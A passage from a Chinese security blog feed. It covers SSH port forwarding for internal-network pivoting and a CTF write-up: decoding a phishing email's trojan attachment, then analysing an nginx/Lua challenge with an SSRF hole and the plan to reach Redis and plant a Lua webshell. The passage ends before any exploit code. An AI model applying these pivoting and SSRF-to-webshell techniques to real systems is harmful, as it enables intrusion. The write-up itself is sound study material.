      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网穿透-ligolo使用</title>
      <link href="/2025/01/14/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F-ligolo%E4%BD%BF%E7%94%A8/"/>
      <url>/2025/01/14/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F-ligolo%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="1-本地端口转发"><a href="#1-本地端口转发" class="headerlink" title="1. 本地端口转发"></a>1. 本地端口转发</h4><p>本地转发通过参数 <code>-L</code> 指定，格式：<code>-L [本地主机:]本地主机端口:远程网络主机:远程网络主机端口</code>。加上ssh待登录主机，这里就有了三台主机。</p><p>举例：ssh -L 0.0.0.0:50000:host2:80 user@host1。这条命令将<code>host2</code>的80端口映射到本地的50000端口，前提是待登录主机<code>host1</code>上可以正常连接到<code>host2</code>的80端口。</p><p>其实就是一个依托ssh隧道的一个正向代理。 在本地开启一个监听端口。然后设置要访问的服务。我们可以通过远程主机服务器,去将我们本地的端口映射到访问指定的主机的端口。</p><h4 id="2-远程端口转发"><a href="#2-远程端口转发" class="headerlink" title="2. 远程端口转发"></a>2. 远程端口转发</h4><p>远程转发是指把登录主机所在网络中某个端口通过本地主机端口转发到远程主机上。<br>远程转发通过参数 <code>-R</code> 指定，格式：<code>-R [登录主机:]登录主机端口:本地网络主机:本地网络主机端口</code>。</p><p>举例：ssh -R host1:8080:本地ip:80 user@host1。其实就是在远程服务器上开一个端口，然后将本地的服务映射到远程的端口。那么其他的能访问远程端口的机器就能访问到我本地的服务。常见于我们本地有一个服务，通过远程vps的端口转发使得别人能够访问到我本地服务。</p><ol><li>sshd_config里要打开<code>AllowTcpForwarding</code>选项，否则<code>-R</code>远程端口转发会失败。</li><li>默认转发到远程主机上的端口绑定的是<code>127.0.0.1</code>，如要绑定<code>0.0.0.0</code>需要打开sshd_config里的<code>GatewayPorts</code>选项</li></ol><h4 id="3-动态转发"><a href="#3-动态转发" class="headerlink" title="3. 动态转发"></a>3. 动态转发</h4><p>动态转发通过参数 <code>-D</code> 指定，格式：<code>-D [本地主机:]本地主机端口</code>。相对于前两个来说，动态转发无需再指定远程主机及其端口。它们由通过 SOCKS协议 连接到本地主机端口的那个主机。</p><p>举例：ssh -D 50000 user@host1。这条命令创建了一个SOCKS代理，所以通过该SOCKS代理发出的数据包将经过<code>host1</code>转发出去。</p><h5 id="3-1-使用"><a href="#3-1-使用" class="headerlink" title="3.1 使用"></a>3.1 使用</h5><p>其实就是一个代理 浏览器直接开代理进行http协议的访问，kali里面就直接proxychains就可以。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件安全赛</title>
      <link href="/2025/01/07/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E8%B5%9B/"/>
      <url>/2025/01/07/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>2025&#x2F;1&#x2F;5打了软件安全赛,针对个人来讲难度还是很大的，所以把出的两个题分析一下。</p><h4 id="1-钓鱼邮件分析"><a href="#1-钓鱼邮件分析" class="headerlink" title="1. 钓鱼邮件分析"></a>1. 钓鱼邮件分析</h4><p>邮件解密,它是所有的都用了base编码 解码 有用的只有下面的正文。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;qmbox&quot;&gt;&lt;p style=&quot;font-family: -apple-system, BlinkMacSystemFont, &amp;quot;PingFang SC&amp;quot;, &amp;quot;Microsoft YaHei&amp;quot;, sans-serif; font-size: 10.5pt; color: rgb(46, 48, 51);&quot;&gt;今天是你的24岁生日，祝你生日快乐&lt;/p&gt;&lt;div xmail-signature=&quot;&quot;&gt;&lt;xm-signature&gt;&lt;/xm-signature&gt;&lt;p&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">X-QQ-XMRINFO: Mp0Kj//9VHAxr69bL5MkOOs=</span><br><span class="line">X-QQ-XMAILINFO: Mi/i+wq2NsJqOjK39baWcJF141jv20ysu7uvjsdVZOQPyBXZKFBBJqrPZCTiKJ</span><br><span class="line"> d7wdGsfbzivUI9F/OZZvBm1nmIa5oNSrj2hkORK7/+5NZPP0GrlCdUnmiEIUxIB4eEIzPsyVFl5gO</span><br><span class="line"> Xf6wdCD4iXuYlexjoTN90TNSwJIqMt8ToLR8AETY5sAwIW7kggpoQxoi1jcsS/xEOpLVhrCDSLktm</span><br><span class="line"> P/95iJcEPLeFb1Bj78s8aljWgWHWNVeyVxoKt/BE9DghasuyQjiOzzl4Lg/UnJM3ALsbAXFJyLW4Q</span><br><span class="line"> /6PKnwZS/VNwNUVhGKFDPU5aWEFSVufu1p5EVl4J3cth2I7LZ/kT8fYox8teauDeml/1f9jQNoGx0</span><br><span class="line"> 2mufT0LbYCncO26MxVRZ5Hb+WK1jcHC3HRzOgy+t695gzOa6iVFTinruQrT1EzEU4p7keQ0Z2uat8</span><br><span class="line"> Ide9mSRWQ0dg0xrqwYXdd19qcfVuVBbi5KC/tAh4OoTjxYh/JCD2gQD0h3fBstrUhK4UISpinTFtB</span><br><span class="line"> zw+Rt5PHOk+KZFufpCYPRjwnFJ7bdFLD76shuYRegxAcwpX7EbwLDTOQ1vSQgTivo6K0Y+620ovSp</span><br><span class="line"> dX/rORvapshvqd41rtXWHd/QAQ3t1A5a/IpO/n1sVJWwSz9Z864P1SJJ3QdgXj3Dz0N6Ch4HujG+M</span><br><span class="line"> bh6XhF4jJRUdtXCCr+TH3TN8KjUz2XUiBccfDD/HPgaac5KUVt+xlvrYBUivd/4iPOyy9y6a0K8Pg</span><br><span class="line"> /xm+Hhec+Bo/nfEndClgLY116fdOmD/3T7QCCmmL1pDfSJe9pnht9mVI7ySS4YyIuANf1La/vUDxl</span><br><span class="line"> kw0beVN9ooCvf9NJGixdVbtdN2RVm+10Qpl1ErR2dyrhMpg8vVzc5ztc/CayChAHmJNpb/MacZSbA</span><br><span class="line"> 392cIqk05wGYxVuq5ETGzL0o9tlik/quWMrHJnPZeVWY2Zl4JvHDUPJYkldGzXO7h8qmcNev9Pm5z</span><br><span class="line"> 4nEsdRYqRGJt/nmncvZv3y7Stt7Shn5/LEJ0OLA9hF3uh6y5m9cUa7zoTjMrPVjCdNJVn8ZLFnZT8</span><br><span class="line"> VVh/0T/zB40wTE76YUO/wTBs1sg==</span><br><span class="line">From: &quot;=?utf-8?B?QWxpY2Nl?=&quot; &lt;Alice@qq.com&gt;</span><br><span class="line">To: &quot;=?utf-8?B?Qm9i?=&quot; &lt;Bob@qq.com&gt;</span><br><span class="line">Subject: =?utf-8?B?55Sf5pel5b+r5LmQ?=</span><br><span class="line">Mime-Version: 1.0</span><br><span class="line">Content-Type: multipart/mixed;</span><br><span class="line">boundary=&quot;----=_NextPart_67318E01_3D423680_3EAF4BE3&quot;</span><br><span class="line">Content-Transfer-Encoding: 8Bit</span><br><span class="line">Date: Mon, 11 Nov 2024 12:54:24 +0800</span><br><span class="line">X-Priority: 3</span><br><span class="line">Message-ID: &lt;tencent_5926819C8C20A292B26A361A43C2F84BEA09@qq.com&gt;</span><br><span class="line">X-QQ-MIME: TCMime 1.0 by Tencent</span><br><span class="line">X-Mailer: QQMail 2.x</span><br><span class="line">X-QQ-Mailer: QQMail 2.x</span><br><span class="line">X-QQ-mid: xmseza31-0t1731300864t1gxcwyus</span><br><span class="line"></span><br><span class="line">This is a multi-part message in MIME format.</span><br><span class="line"></span><br><span class="line">------=_NextPart_67318E01_3D423680_3EAF4BE3</span><br><span class="line">Content-Type: multipart/alternative;</span><br><span class="line">boundary=&quot;----=_NextPart_67318E01_3D423680_45B6667D&quot;;</span><br><span class="line"></span><br><span class="line">------=_NextPart_67318E01_3D423680_45B6667D</span><br><span class="line">Content-Type: text/plain;</span><br><span class="line">charset=&quot;utf-8&quot;</span><br><span class="line">Content-Transfer-Encoding: base64</span><br><span class="line"></span><br><span class="line">5LuK5aSp5piv5L2g55qEMjTlsoHnlJ/ml6XvvIznpZ3kvaDnlJ/ml6Xlv6vkuZA=</span><br><span class="line">今天是你的24岁生日，祝你生日快乐</span><br><span class="line"></span><br><span class="line">------=_NextPart_67318E01_3D423680_45B6667D</span><br><span class="line">Content-Type: text/html;</span><br><span class="line">charset=&quot;utf-8&quot;</span><br><span class="line">Content-Transfer-Encoding: base64</span><br><span class="line"></span><br><span class="line">PGRpdiBjbGFzcz0icW1ib3giPjxwIHN0eWxlPSJmb250LWZhbWlseTogLWFwcGxlLXN5c3Rl</span><br><span class="line">bSwgQmxpbmtNYWNTeXN0ZW1Gb250LCAmcXVvdDtQaW5nRmFuZyBTQyZxdW90OywgJnF1b3Q7</span><br><span class="line">TWljcm9zb2Z0IFlhSGVpJnF1b3Q7LCBzYW5zLXNlcmlmOyBmb250LXNpemU6IDEwLjVwdDsg</span><br><span class="line">Y29sb3I6IHJnYig0NiwgNDgsIDUxKTsiPuS7iuWkqeaYr+S9oOeahDI05bKB55Sf5pel77yM</span><br><span class="line">56Wd5L2g55Sf5pel5b+r5LmQPC9wPjxkaXYgeG1haWwtc2lnbmF0dXJlPSIiPjx4bS1zaWdu</span><br><span class="line">YXR1cmU+PC94bS1zaWduYXR1cmU+PHA+PC9wPjwvZGl2PjwvZGl2Pg==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------=_NextPart_67318E01_3D423680_45B6667D--</span><br><span class="line"></span><br><span class="line">------=_NextPart_67318E01_3D423680_3EAF4BE3</span><br><span class="line">Content-Type: application/octet-stream;</span><br><span class="line">charset=&quot;utf-8&quot;;</span><br><span class="line">name=&quot;=?utf-8?B?55Sf5pel56S854mpLnppcA==?=&quot;</span><br><span class="line">Content-Disposition: attachment; filename=&quot;=?utf-8?B?55Sf5pel56S854mpLnppcA==?=&quot;</span><br><span class="line">Content-Transfer-Encoding: base64</span><br><span class="line"></span><br><span class="line">------=_NextPart_67318E01_3D423680_3EAF4BE3--</span><br></pre></td></tr></table></figure><p>解码 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decodebase</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mail.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span>  file:</span><br><span class="line">        message=file.read()</span><br><span class="line">    message=message.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># print(message)</span></span><br><span class="line">    demessage=base64.b64decode(message)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file1:</span><br><span class="line">        file1.write(demessage)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    decodebase()</span><br></pre></td></tr></table></figure><p>拿到zip包解压 密码直接爆破</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250106114215.png" alt="image.png"></p><p>打开就发现了木马文件沙箱直接分析。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250106114302.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250106114318.png" alt="image.png"><br>分析到ip 和端口</p><h4 id="2-web1"><a href="#2-web1" class="headerlink" title="2. web1"></a>2. web1</h4><p>拿到docker，分析出这个利用nginx 和lua进行搭建的web站点。先看nginx配置信息</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    root   html;</span><br><span class="line">    index  index.html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location /visit &#123;</span><br><span class="line">    default_type text/plain;</span><br><span class="line">    content_by_lua_file /usr/local/openresty/nginx/lua/main.lua;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到两个路由，一个是由index.html处理&#x2F; 另外一个是由main.lua处理&#x2F;visit于是首先分析<br>index.html</p><h5 id="2-1-index-html"><a href="#2-1-index-html" class="headerlink" title="2.1 index.html"></a>2.1 index.html</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>URL Visitor<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Visit a Website<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;urlInput&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter a URL&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;visitUrl()&quot;</span>&gt;</span>Visit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 触发函数 进行url访问--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;urlFrame&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">visitUrl</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> url = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;urlInput&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;urlFrame&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &lt;!-- 相当于src 中的url换成了我们的拼接的get传递参数的值--&gt;</span></span><br><span class="line"><span class="language-javascript">            iframe.<span class="property">src</span> = <span class="string">&#x27;/visit?url=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(url);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因此就可以看出来还是在&#x2F;visit路由上在做文章，而&#x2F;visit通过nginx的配置文件可以看出。&#x2F;visit的路由是由main.lua进行处理的。</p><h5 id="2-2-main-lua"><a href="#2-2-main-lua" class="headerlink" title="2.2 main.lua"></a>2.2 main.lua</h5><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 打开一个文件并且将文件内容读出来</span></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">read_file</span><span class="params">(filename)</span></span></span><br><span class="line">    <span class="keyword">local</span> file = <span class="built_in">io</span>.<span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: Could not open file &quot;</span> .. filename)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> content = file:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>)</span><br><span class="line">    file:<span class="built_in">close</span>()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 执行对应的lua 代码 </span></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">execute_lua_code</span><span class="params">(script_content)</span></span></span><br><span class="line"><span class="comment">-- 先找到 ##LUA_START##(.-)##LUA_END##  这两个特征内部的内容</span></span><br><span class="line">    <span class="keyword">local</span> lua_code = script_content:<span class="built_in">match</span>(<span class="string">&quot;##LUA_START##(.-)##LUA_END##&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> lua_code <span class="keyword">then</span></span><br><span class="line">    <span class="comment">-- 加载 代码</span></span><br><span class="line">        <span class="keyword">local</span> chunk, err = <span class="built_in">load</span>(lua_code)</span><br><span class="line">        <span class="keyword">if</span> chunk <span class="keyword">then</span></span><br><span class="line">        <span class="comment">-- 执行代码 </span></span><br><span class="line">            <span class="keyword">local</span> success, result = <span class="built_in">pcall</span>(chunk)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> success <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Error executing Lua code: &quot;</span>, result)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error loading Lua code: &quot;</span>, err)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: No valid Lua code block found.&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 主函数  打开脚本文件读取出内容然后传递给执行函数</span></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> filename = <span class="string">&quot;/scripts/visit.script&quot;</span></span><br><span class="line">    <span class="keyword">local</span> script_content = read_file(filename)</span><br><span class="line">    <span class="keyword">if</span> script_content <span class="keyword">then</span></span><br><span class="line">        execute_lua_code(script_content)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出内部主要是执行了 visit.script 这才是核心</p><h5 id="2-3-visit-script"><a href="#2-3-visit-script" class="headerlink" title="2.3 visit.script"></a>2.3 visit.script</h5><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">##LUA_START##</span><br><span class="line"><span class="comment">-- 这就是刚才的参数传递的参数 </span></span><br><span class="line"><span class="keyword">local</span> curl = <span class="built_in">require</span>(<span class="string">&quot;cURL&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> redis = <span class="built_in">require</span>(<span class="string">&quot;resty.redis&quot;</span>)</span><br><span class="line"></span><br><span class="line">ngx.req.read_body()</span><br><span class="line"><span class="keyword">local</span> args = ngx.req.get_uri_args()</span><br><span class="line"><span class="keyword">local</span> url = args.url</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> url <span class="keyword">then</span></span><br><span class="line">    ngx.say(<span class="string">&quot;URL parameter is missing!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 开始连接redis</span></span><br><span class="line"><span class="keyword">local</span> red = redis:new()</span><br><span class="line">red:set_timeout(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> ok, err = red:connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ok <span class="keyword">then</span></span><br><span class="line">    ngx.say(<span class="string">&quot;Failed to connect to Redis: &quot;</span>, err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 访问对应的 url 拿到结果 这其实只是个查看缓存的操作。</span></span><br><span class="line"><span class="comment">-- 查看是否之前 有这个缓存</span></span><br><span class="line"><span class="keyword">local</span> res, err = red:get(url)</span><br><span class="line"><span class="keyword">if</span> res <span class="keyword">and</span> res ~= ngx.null <span class="keyword">then</span></span><br><span class="line">    ngx.say(res)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 连接</span></span><br><span class="line"><span class="keyword">local</span> c = curl.easy &#123;</span><br><span class="line">    url = url,</span><br><span class="line">    timeout = <span class="number">5</span>,</span><br><span class="line">    connecttimeout = <span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> response_body = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 连接远程  并且 存储响应</span></span><br><span class="line">c:setopt_writefunction(<span class="built_in">table</span>.<span class="built_in">insert</span>, response_body)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> ok, err = <span class="built_in">pcall</span>(c.perform, c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ok <span class="keyword">then</span></span><br><span class="line">    ngx.say(<span class="string">&quot;Failed to perform request: &quot;</span>, err)</span><br><span class="line">    c:<span class="built_in">close</span>()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">c:<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 存储响应到redis</span></span><br><span class="line"><span class="keyword">local</span> response_str = <span class="built_in">table</span>.<span class="built_in">concat</span>(response_body)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> ok, err = red:setex(url, <span class="number">3600</span>, response_str)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ok <span class="keyword">then</span></span><br><span class="line">    ngx.say(<span class="string">&quot;Failed to save response in Redis: &quot;</span>, err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">ngx.say(response_str)</span><br><span class="line">##LUA_END##</span><br></pre></td></tr></table></figure><h5 id="2-4-分析"><a href="#2-4-分析" class="headerlink" title="2.4 分析"></a>2.4 分析</h5><p>目前已经很明显了，其实就是url请求，很自然就能想到ssrf 然后利用ssrf打redis 。经过了多次尝试发现 无论是ssh ，定时任务都无法成功，自然想到利用木马，但是我们又写不成php马。要写lua马。但是lua的路由已经固定了，我们就去重写main.lua 但是尝试失败，因为在redis写马时候我们会有很多的乱码版本信息。严重影响了lua的解析。</p><p>但是我们发现 在main.lua有这样一句话。我们完全可以重写visit.script。然后使用这个match的特征匹配就可以完全解决乱码的问题。使得我们的结果成功解析。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> lua_code = script_content:<span class="built_in">match</span>(<span class="string">&quot;##LUA_START##(.-)##LUA_END##&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="2-5-exp"><a href="#2-5-exp" 